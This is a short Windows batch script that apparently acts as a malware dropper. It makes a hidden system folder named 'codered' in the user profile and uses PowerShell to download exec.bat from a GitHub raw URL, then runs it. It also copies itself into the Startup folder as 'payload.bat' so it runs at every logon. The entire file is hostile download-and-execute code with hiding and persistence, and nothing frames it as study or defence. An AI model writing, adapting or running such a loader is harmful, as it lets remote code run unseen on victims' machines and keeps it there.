@echo off
C:
cd %USERPROFILE%
md codered
attrib +s +h codered
cd %USERPROFILE%\codered
powershell -Command (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/timberh789/Server/main/exec.bat', 'exec.bat')
start %USERPROFILE%\codered\exec.bat
echo move /Y %0 "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\payload.bat">pls.bat
start pls.bat
